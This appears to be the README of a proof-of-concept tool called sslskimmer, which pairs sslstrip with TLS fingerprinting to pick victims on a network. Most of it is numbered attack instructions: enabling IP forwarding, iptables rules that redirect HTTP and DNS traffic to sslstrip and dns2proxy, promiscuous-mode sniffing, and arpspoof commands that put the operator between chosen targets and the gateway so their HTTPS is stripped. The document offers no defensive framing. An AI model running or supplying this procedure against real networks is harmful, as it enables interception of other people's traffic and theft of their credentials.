# sslskimmer

This is a proof-of-concept implementation of targeting sslstrip with TLS fingerprints.

## Instructions

You're going to need to install dnspython and arpspoof on a machine with a wired connection and an AP-mode-capable wifi card.  I've only tested this on Linux and you need root to do it.

1. flip machine into forwarding mode
`echo "1" > /proc/sys/net/ipv4/ip_forward`

2. redirect http traffic to sslstrip.  <listenport> is 10000 unless you changed it.

`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <listenPort>`

`iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53`

3. run setup.py in /sslstrip2/ and set execution permissions on skim.sh and all files it calls

4. run make in /tls-fingerprinting/fingerprintls

5. set your wifi card to promiscuous mode.  run ifconfig to find its interface name, then

`ifconfig <name> promisc`

6. Run dns2proxy.py, sslstrip.py, and fingerprintls on the appropriate network interfaces.  <interfaceName> is probably something like wlan0.

`python ./dns2proxy/dns2proxy.py`

`python ./sslstrip2/sslstrip.py -l <listenPort>`

`./tls-fingerprinting/fingerprintls/fingerprintls -i <interfaceName>`

7. Individually run arpspoof on desirable target IPs when you see them in fingerprintls' output.  As soon as you have MitM between them and the server you will automatically begin sslstripping them.  You will need to know the network gateway's IP; you can find this with route -n.

`arpspoof -i wlan0 -t <targetIP> <gatewayIP>`

## Explanation

We set up the DNS proxy, run sslstrip, and begin sniffing packets and checking fingerprints with fingerprintls.  If fingerprintls matches a fingerprint that you're trying to hit, you run a new instance of arpspoof to get between the fingerprint's IP and the router, at which point sslstrip2 does what it does.
